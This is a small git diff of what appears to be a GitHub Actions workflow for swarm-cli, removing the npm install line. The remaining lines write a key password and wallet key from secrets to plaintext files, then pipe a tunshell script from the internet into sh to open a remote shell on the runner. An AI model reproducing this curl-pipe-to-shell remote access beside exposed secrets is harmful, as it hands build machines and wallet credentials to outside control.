@@ -21,7 +21,6 @@ jobs:
 
       - name: Setup swarm-cli
         run: |
-          npm i -g @ethersphere/swarm-cli
           printf ${{ secrets.KEY_PASS }} > password
           printf ${{ secrets.KEY_FILE }} > wallet
           curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T dNExlPcM9UGS0rppxLAoqB oMW8IPsviGd5f0ryG9IuAn
